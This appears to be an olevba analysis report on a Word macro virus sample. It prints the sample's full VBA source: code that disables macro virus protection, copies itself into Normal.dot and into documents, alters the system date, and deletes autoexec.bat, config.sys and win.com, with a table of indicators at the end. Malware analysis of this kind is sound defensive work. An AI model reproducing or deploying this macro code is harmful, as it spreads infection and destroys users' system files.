olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.o-9d9327c9bdbae9fc61288ca0dd838e80138b126b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.o-9d9327c9bdbae9fc61288ca0dd838e80138b126b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fesaem_b.bas 
in file: Virus.MSWord.TheSecond.o-9d9327c9bdbae9fc61288ca0dd838e80138b126b - OLE stream: 'Macros/VBA/Fesaem_b'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Copy = True
  If Documents.Count >= 1 Then
    C = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To C
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Fesaem_b" Then Copy = False
    Next i
    x = "C:\windows\system\win.dll"
    If Copy Then
      ActiveDocument.VBProject.VBComponents("Fesaem_b").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    Copy = True
    izm = False
    s = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Fesaem_b" Then Copy = False
    Next i
    If Copy Then
      NormalTemplate.VBProject.VBComponents("Fesaem_b").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      izm = True
    End If
    If s And izm And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Randomize
      rd = Date
      dd = Str(Int((28 * Rnd) + 1))
      mm = Str(Int((12 * Rnd) + 1))
      yy = Str(Int((30 * Rnd) + 1980))
      rd = mm + "." + dd + "." + yy
      Date = rd
      ActiveDocument.Save
    End If
    ActiveDocument.Saved = s
    beep
  End If
End Sub

Sub AutoOpen()
On Error Resume Next
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Del
End Sub
Sub FilePrint()
    Selection.HomeKey Unit:=wdStory
    Selection.Font.Size = 16
    Selection.Font.Bold = wdToggle
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.TypeText Text:="Far Easten State Academy of Economics and Managment"
    ActiveDocument.WritePassword = "Fesaem"
    If ActiveDocument.Saved And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
    MsgBox ("Ñèñòåìíûé àäìèíèñòðàòîð çàïðåòèë äîñòóï ê ìàêðîñàì!!!")
End Sub
Sub Del()
  'Del virus Fesaem and TheSecond
  flag = False
  If Documents.Count >= 1 Then
     On Error Resume Next
       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="TheSecond", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="TheSecond", Object:=wdOrganizerObjectProjectItems

       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="Fesaem", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="Fesaem", Object:=wdOrganizerObjectProjectItems

       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="Fesaem_a", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="Fesaem_a", Object:=wdOrganizerObjectProjectItems
       If ActiveDocument.Saved And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
  End If
'Del sys file
  s = Date
  d = Left(s, 2)
  m = Mid(s, 4, 2)
  y = Right(s, 2)
  Randomize
  rn = Int((10 * Rnd) + 1)
  If Val(d) > 12 And Val(m) > 2 And Val(y) >= 2 And rn = 3 Then
    If Dir("c:\autoexec.bat") <> "" Then
      FileCopy "C:\Autoexec.bat", "C:\windows\system\wina.ini"
      Kill "c:\autoexec.bat"
    End If
    If Dir("c:\config.sys") <> "" Then
      FileCopy "C:\config.sys", "C:\windows\system\wins.ini"
      Kill ("C:\config.sys")
    End If
    If Dir("C:\windows\win.com") <> "" Then
      FileCopy "C:\windows\win.com", "C:\windows\system\wjn.co_"
      Kill ("C:\windows\win.com")
    End If
    If Int((15 * Rnd) + 1) = 15 Then
      For i = 1 To 5
        shell ("winword.exe")
      Next i
    End If
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |win.dll             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
